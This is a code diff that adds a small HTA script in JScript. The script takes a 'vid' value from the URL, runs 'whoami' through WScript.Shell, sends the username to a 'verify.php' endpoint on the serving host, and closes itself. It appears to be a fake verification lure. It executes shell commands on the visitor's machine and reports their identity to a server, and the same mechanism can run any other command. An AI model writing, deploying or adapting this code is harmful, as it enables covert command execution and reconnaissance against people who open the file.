@@ -1,0 +1,30 @@
+<script language="JScript">
+  // collect vid from query-string
+  var qs    = location.search.substring(1).split('&'),
+      vid;
+  for (var i = 0; i < qs.length; i++) {
+    var pair = qs[i].split('=');
+    if (pair[0] === 'vid') vid = pair[1];
+  }
+
+  // run whoami
+  var shell = new ActiveXObject('WScript.Shell'),
+      raw   = shell.Exec('whoami').StdOut.ReadAll(),
+      user  = raw.replace(/^[\s\r\n]+|[\s\r\n]+$/g,'');
+
+  // build base URL (works in HTA even if location.origin is missing)
+  var base = location.protocol + '//' + location.host;
+
+  // single, all-in-one call to your PHP verify
+  var xhr = new ActiveXObject('MSXML2.XMLHTTP');
+  xhr.open(
+    'GET',
+    base + '/verify.php?vid=' + vid +
+      '&whoami=' + encodeURIComponent(user),
+    false
+  );
+  xhr.send();
+
+  // done
+  window.close();
+</script>
